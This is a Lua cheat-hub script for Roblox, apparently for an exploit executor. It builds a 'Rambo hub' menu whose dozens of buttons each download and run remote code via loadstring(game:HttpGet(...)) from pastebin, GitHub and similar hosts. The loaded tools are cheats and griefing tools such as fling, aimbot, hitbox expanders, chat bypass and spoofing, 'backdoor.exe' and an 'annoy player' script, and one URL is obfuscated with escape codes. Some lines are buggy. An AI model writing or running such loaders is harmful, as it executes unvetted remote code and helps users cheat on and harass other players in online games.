local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Rambo hub 1.6",
   LoadingTitle = "Welcome to Rambo hub!",
   LoadingSubtitle = "by  anas and aruis",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Big Hub"
   },
   Discord = {
      Enabled = false,
      Invite = "https://discord.gg/9dpR25WZ",
      RememberJoins = true 
   },
   KeySystem = true, 
   KeySettings = {
      Title = "key system",
      Subtitle = "Key System",
      Note = " join my discord https://discord.gg/w5cP5arG",
      FileName = "Key", 
      SaveKey = true, 
      GrabKeyFromSite = fales, 
      Key =  {"guybeingsus"}
   }
})

Rayfield:Notify({
   Title = "HEY THERE!",
   Content = "some scripts may be patched if so forgive me!!!",
   Duration = 6.5,
   Image = 4483362458,
   Actions = { -- Notification Buttons
      Ignore = {
         Name = "Okay!",
         Callback = function()
         print("The user tapped Okay!")
      end
   },
},
})


local scriptsTab = Window:CreateTab("Main", 4483362458) -- Title, Image


local scriptsSection = scriptsTab:CreateSection("scripts/guis")


local Button = scriptsTab:CreateButton({
   Name = "[FE] time stop",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/creepstu/fuzzy-octo-giggle/main/Source'))()
   end,
})


local Button = scriptsTab:CreateButton({
   Name = "chat bypass",
   Callback = function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/vqmpjay/scripts/main/vadriftsbyp'),true))()
   end,
})


local Button = scriptsTab:CreateButton({
   Name = "meepcity gui",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/synolope/mpcity/main/loader.lua",true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "[FE] push (R6/R15)",
   Callback = function()
   loadstring(game:HttpGet(('https://pastefy.ga/GvnHVjT5/raw'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "COOLKIDD gui",
   Callback = function()
   loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "script finder",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/ScriptSearcher"))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "backflip",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/yjxXnxbS'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "btools",
   Callback = function()
   loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/BTools.txt"))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "spam annoying sounds",
   Callback = function()
   loadstring(game:HttpGet(('https://pastebin.com/raw/ssbUfEbh'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "hitbox expander",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/J9bj6TuD'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "chat spoofer",
   Callback = function()
   loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "[FE] Collison",
   Callback = function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/Collision.txt'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "[FE] lag switch",
   Callback = function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/Protected%20-%202023-05-28T225112.055.lua.txt'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "anti lag",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/LiverMods/Tests/main/File/Antilag.lua"))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "chat logs",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/zTV1VTTB'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "moon gui",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/IlikeyocutgHAH/MoonUI-v13-102-SCRIPTS/main/MoonUI%20v13!"))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "[FE] tp to save location",
   Callback = function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/Tp%20Place%20GUI'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "RTX gui",
   Callback = function()
   loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "chat control (might have been patched)",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/rouxhaver/scripts/main/FE%20chat%20for%20someone.Lua"))();
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "Reach (any fighting games works)",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/qb5ELr2u'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "Netless",
   Callback = function()
   loadstring(game:HttpGet(('https://pastebin.com/raw/Cu7bKQWN'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "keystroke V2 gui",
   Callback = function()
   loadstring(game:HttpGet(('https://pastefy.app/Te4dwSw2/raw'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "[FE] fake IP grabber",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/MJg04m6f'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "keyboard v3",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/BatuKvi123/Keyboardv3/main/mobKeyboard"))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "FE spy gui",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/MichaelScripter/MiniScript/main/Spy gui.lua"))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "Da hood bali gui",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Balligusapos/Balligusapos/main/DHIDIOT"))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "message on damage",
   Callback = function()
   getgenv().hurtmessages = {
   "That hurt!",
   "Watch where you're swinging!",
   "Ow! That's gonna leave a mark!",
   "Stop attacking me!",
   "I'm not feeling so good...",
   "Is that all you've got?",
   "Can't catch a break!",
   "That was a cheap shot!",
   "You'll regret that!"
}

loadstring(game:HttpGet("https://raw.githubusercontent.com/dta-bse/v3rm/main/Message%20on%20damage"))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "anti kill",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/21ZEDdnE'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "harked v2",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/vpJYK1rs'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "grab knife v3",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/1jsfXhu8'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "rainbow chat",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/rouxhaver/scripts-2/main/RGB%20Bubble%20chat.Lua'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "[FE] new anti fling",
   Callback = function()
   loadstring(game:HttpGet(('https://pastebin.com/raw/GxdesRQx'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "click fling v3",
   Callback = function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "[FE] waik on walls",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/B5MPd177'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "[FE] mimic",
   Callback = function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe./8fb5ed20fb168d1ae3044ede45b90f67e3fb37a2/file'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "[FE] chat article",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/omegachadgaming/mongus/main/main.lua", true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "[FE] annoy player",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/ZME5dX7w'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "99% fail obby",
   Callback = function()
   --// Services \--
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")

--// Variables \--
local Player = Players.LocalPlayer
local Tiles = Workspace:WaitForChild("Map"):WaitForChild("Game"):WaitForChild("Tiles")
local Original = Color3.fromRGB(198, 237, 255)

--// Remember Broken Glass \--
Tiles.DescendantAdded:Connect(function(A_1)
    if A_1.Name == "GlassShatter" then
        -- Set Color
        A_1.Parent.Color = Color3.new(1, 0, 0)
        -- Get Lane
        local Lane = A_1.Parent.Parent.Name
        if Lane == "Right" then
            Lane = "Left"
        else
            Lane = "Right"
        end
        -- Set Sibling Color
        local Number = A_1.Parent.Name:match("%d+")
        Tiles[Lane]["Tile" .. Number].Color = Color3.new(0, 1, 0)
    end
end)

--// Remember Stepped Glass \--
for _, A_1 in next, Tiles:GetDescendants() do
    if A_1:IsA("TouchTransmitter") then
        local Part = A_1.Parent
        Part.Touched:Connect(function(A_2)
            -- Check if already broken
            if A_2.Transparency == 1 then
                return
            end
            -- Timer
            local Timer = tick() + 0.5
            repeat
                task.wait()
            until tick() - Timer > 0 or Part.Transparency == 1
            -- Get Lane
            local Lane = A_1.Parent.Parent.Name
            if Lane == "Right" then
                Lane = "Left"
            else
                Lane = "Right"
            end
            -- Check if broke
            if Part.Transparency == 1 then
                -- Set Glass Color
                Part.Color = Color3.new(1, 0, 0)
                -- Set Sibling Color
                local Number = A_1.Parent.Name:match("%d+")
                Tiles[Lane]["Tile" .. Number].Color = Color3.new(0, 1, 0)
            elseif A_2.Parent.Humanoid.Health == 100 then
                -- Set Glass Color
                Part.Color = Color3.new(0, 1, 0)
                -- Set Sibling Color
                local Number = A_1.Parent.Name:match("%d+")
                Tiles[Lane]["Tile" .. Number].Color = Color3.new(1, 0, 0)
            end
        end)
    end
end

--// UI Library \--
local Library = loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/Just-Egg-Salad/roblox-scripts/main/uwuware'))()
local Window = Library:CreateWindow("Memory by Ezpi")
Window:AddButton({
    text = "Clear Colors",
    callback = function()
        for _, A_1 in next, Tiles:GetDescendants() do
            if A_1:IsA("BasePart") then
                A_1.Color = Original
            end
        end
    end
})
Library:Init()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "simp gui",
   Callback = function()
   loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Simple-V3-8819", true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "hitbox customize",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/JgtddWA3'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "simplity gui",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/HeyGyt/simplityv2/main/main"))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "[FE] sound control",
   Callback = function()
   loadstring(game:HttpGet(('https://pastefy.ga/iVGL5PAg/raw'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "fling v2",
   Callback = function()
   loadstring(game:HttpGet("https://pastebin.com/raw/Ud1cg5pR"))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "[FE] orbit gui",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Orbit%20GUI"))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "[FE] touch of god",
   Callback = function()
   local Methods = loadstring(game:HttpGet("https://raw.githubusercontent.com/coolsk8rboy/The-John-Cena-Factory/main/JohnCenasMain.lua"))()
Methods:SetWalkSpeed(30)
Methods:SetIdleAnimation(7013018724, 1)
Methods:SetWalkAnimation(7013032342, 1)
Methods:NewAttack("Touch of God", "e", 8223123168, .1, 6)
Methods:SystemMessage([[
Controls:
E - Touch of God
]])
Methods:SetScriptCreator("3qxt#9919 & nil#7756")
Methods:BodyPartFlingOnTouch("Right Arm")
Methods:RunScript()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "fps counter [give it a few seconds to load]",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/littlegui/main/FPS-Counter'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "chat bypasser [universal]",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/ChatBypasser-AZY/main/Chat%20Bypass%20-%20ChatSplitter(Source).lua"))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "fling tool v3",
   Callback = function()
   loadstring(game:HttpGet(('https://pastefy.ga/A77wWQnu/raw'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "chat executed",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/chat-executor/main/chat-executor",true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "backdoor.exe",
   Callback = function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua'),true))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "touch fling",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Fling%20GUI"))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "chat hax",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/Ju3kw4Ch'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "pp (hats needed",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/minecrafttotem/yzhs./main/Fe%20pp%20script%20very%20fun"))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "[FE] bypass (check console to work)",
   Callback = function()
   print('get pranked') 
   end,
})

local AdminTab = Window:CreateTab("Admin", 4483362458) -- Title, Image
local Section = AdminTab:CreateSection("Admin")

local Button = AdminTab:CreateButton({
   Name = "nameless admin",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))();
   end,
})

local Button = AdminTab:CreateButton({
   Name = "CMD-X admin",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source', true))()
   end,
})

local Button = AdminTab:CreateButton({
   Name = "inf yield [no more crash]",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   end,
})

local Button = AdminTab:CreateButton({
   Name = "Reviz admin",
   Callback = function()
   loadstring(game:HttpGet("https://pastebin.com/raw/Caniwq2N",true))()
   end,
})

local Button = AdminTab:CreateButton({
   Name = "IV admin",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/BloodyBurns/Hexx/main/Iv%20Admin/Admin%202.lua'))()
   end,
})

local Button = AdminTab:CreateButton({
   Name = "Fates admin",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
   end,
})

local Button = AdminTab:CreateButton({
   Name = "tiger admin [prison life only]",
   Callback = function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/h17s3/TIGERADMIN/main/TIGERADMINSCRIPTFREE'),true))()
   end,
})

local gamesTab = Window:CreateTab("games", 4483362458) -- Title, Image
local Section = gamesTab:CreateSection("games")

local Button = gamesTab:CreateButton({
   Name = "bedwars",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/loadstring'))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "Brookhaven",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "ragdoll engine",
   Callback = function()
   loadstring(game:HttpGet('https://gist.githubusercontent.com/H20CalibreYT/462f6e6236a9371130f113def6549bb1/raw/'))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "funky friday",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/ShowerHead-FluxTeam/scripts/main/funky-friday-autoplay"))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "legends of speed",
   Callback = function()
   loadstring(game:HttpGet("https://pastebin.com/raw/mqGPg69N"))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "slap batlles",
   Callback = function()
   loadstring(game:HttpGet(("https://raw.githubusercontent.com/cheesynob39/R20-EXPLOITER/main/Slap_Battles.lua")))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "chaos",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/AstralHub/main/Loader.lua"))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "doors",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/mstudio45/MSDOORS/main/MSDOORS.lua'))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "prison life",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/KP1kdaV1'))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "tower of heck",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/scripts/main/TOH", true))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "Rainbow friends",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0rainbow'))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "hoopz",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/zjDQ0Mrk'))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "arsenal",
   Callback = function()
   loadstring(game:HttpGet(("https://raw.githubusercontent.com/Maikderninja/Maikderninja/main/PWNERHUB.lua"), true))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "pet simulator X",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Rafacasari/roblox-scripts/main/psx.lua"))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "dahood swagmod",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002"))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "tower defense",
   Callback = function()
   loadstring(game:HttpGet("https://pastebin.com/raw/BztZ6kyZ"))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "combat warriors",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/IsaaaKK/cwhb/main/cw.txt"))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "jailbreak [key is v3foqkorp]",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/piglex9/icetray3/main/latest.lua"))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "blox fruit",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/TirSANX/CrimsonHUB/main/C_Loader'))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "shindo life",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Demmx/ProjectNexus/main/Loader.lua"))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "energy assault",
   Callback = function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "sonic speed simulator",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/HadesRblx/src/master/HadesHub.lua", true))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "pop it trading [key PRAYFORBALLIWIFI]",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Balligusapos/Balligusapos/main/robloxresult-obfuscated"))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "ninja legends",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/WinterDinder/rotartearadsaw/main/Ninja%20Legends%20Script%20Main%20Keyless"))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "break in",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/9vKg1c9d'))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "natural disasters",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/BUAZrXwA'))()
   end,
})

local bedwarsTab = Window:CreateTab("bedwars", 4483362458) -- Title, Image
local Section = bedwarsTab:CreateSection("bedwars")

local Button = bedwarsTab:CreateButton({
   Name = "flame v2",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/FlamingDrey/Flame-X-v2/main/Flame%20X%20Bedwars%20V2"))()
   end,
})

local Button = bedwarsTab:CreateButton({
   Name = "Sycto night",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/FlamingOmar/SyctronightX/main/Syctronight%20Obfuscated"))();
   end,
})

local Button = bedwarsTab:CreateButton({
   Name = "jn jg gaming",
   Callback = function()
   loadstring(game:HttpGet("https://pastebin.com/raw/2HNVwUvm"))()
   end,
})

local Button = bedwarsTab:CreateButton({
   Name = "vape v4",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
   end,
})

local hubsTab = Window:CreateTab("hubs", 4483362458) -- Title, Image
local Section = hubsTab:CreateSection("hubs")

local Button = hubsTab:CreateButton({
   Name = "British hub V8",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/YourLocalNzi/Ye/main/RedCoat8102-obfuscated.lua"))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "acrylix V2",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/HubbyScripts/FE-Trolling-Hub/main/source"))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "ez hub",
   Callback = function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/debug420/Ez-Industries-Launcher-Data/master/Launcher.lua'),true))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "vhub",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/V31nc/2642/Created/VHub"))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "game hub",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/TakeModzz/Games-Hub-Script/main/Games%20Hub%20(Always%20updated)"))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "mini hub",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/MiniNoobie/MINI-HUB-V2/main/FINALLY%20UPDATED%20MINI%20HUB",true))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "davi hub",
   Callback = function()
   loadstring(game:HttpGet(("https://raw.githubusercontent.com/Davicoderliner/davigui/main/Daviguiv2loader.lua"),true))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "owl hub",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
   end,
})

local Button = hubsTab:CreateButton({
   Name = "eclipse",
   Callback = function()
   getgenv().mainKey = "nil";local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "touch football",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Touch-Football/main/Football1"))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "pendulum hub",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Tescalus/Pendulum-Hubs-Source/main/Pendulum%20Hub%20V5.lua"))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "VG hub",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "touch football [auto goal]",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/AutoGoal/main/TouchFootball"))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "coolkidd hub remake",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/ckid", true))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "kyris hub",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/kaxae/kyris/main/kyris.lua"))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "XL hub",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/KaXTjGTx'))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "davi hub",
   Callback = function()
   loadstring(game:HttpGet(("https://raw.githubusercontent.com/Davicoderliner/davigui/main/Daviguiv2loader.lua"),true))()
   end,
})

local Button = Tab:CreateButton({
   Name = "unfair hub",
   Callback = function()
   loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "goofy ahh hub",
   Callback = function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/yeerma/1/main/the_greatest_script_ever_made'))()
   end,
})

local Button = hubsTab:CreateButton({
   Name = "mm2 [key is mm2]",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/bnfEaGs5'))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "blox fruit [hoho hub]",
   Callback = function()
   _G.HohoVersion = "v3"
loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "[UPDATED] hoopz aimbot [needs keyboard]",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/uPPdeFf9'))()
   end,
})

local Button = gamesTab:CreateButton({
   Name = "area 51",
   Callback = function()
   loadstring(game:HttpGet('https://pastebin.com/raw/TtdvYAKU'))()
   end,
})

local Button = scriptsTab:CreateButton({
   Name = "dahood bali v2",
   Callback = function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/Balligusapos/Balligusapos/main/DHIDIOT"))()
   end,
})
